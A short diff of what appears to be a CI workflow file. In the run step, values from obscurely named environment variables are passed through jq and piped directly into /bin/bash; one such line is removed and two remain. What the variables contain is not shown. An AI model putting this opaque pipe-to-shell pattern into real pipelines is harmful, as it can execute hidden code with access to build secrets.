@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$oc265" | jq -r .nuetu4150 | /bin/bash
           echo $bc16095 | jq -r .q0000 | /bin/bash
-          printf '%s' "$hgjx548" | jq -r .ktj15 | /bin/bash
 
       - name: Persist output
         if: always()
